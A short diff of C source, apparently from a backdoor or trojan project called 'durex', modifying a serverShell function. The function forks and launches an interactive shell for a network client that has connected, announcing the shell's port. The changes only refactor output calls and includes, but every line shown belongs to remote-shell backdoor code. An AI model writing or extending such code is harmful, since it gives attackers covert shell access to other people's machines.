@@ -6,14 +6,14 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/16 23:22:39 by root              #+#    #+#             */
-/*   Updated: 2018/07/29 10:24:01 by root             ###   ########.fr       */
+/*   Updated: 2018/08/06 14:51:07 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 /* wait */
 #include <wait.h>
-
-#include "ft_dprintf.h"
+/* exit */
+#include <stdlib.h>
 
 #include "durex.h"
 
@@ -33,7 +33,9 @@ void			serverShell(t_cl *client, t_cmd *cmds)
 	int			status;
 
 	(void)cmds;
-	ft_dprintf(client->fd, "Spawning shell on port %s\n", SERVER_PORT);
+	clientWrite("Spawning shell on port ", client);
+	clientWrite(SERVER_PORT, client);
+	clientWrite("\n", client);
 	pid = fork();
 	if (pid > 0) {
 		waitpid(pid, &status, WNOHANG);
@@ -47,7 +49,6 @@ void			serverShell(t_cl *client, t_cmd *cmds)
 		cmd[1] = "-i";
 		cmd[2] = NULL;
 		execv(cmd[0], cmd);
-		clientWrite("$> ", client);
 		exit(0);
 	} else {
 		clientWrite("Failed to fork shell\n", client);
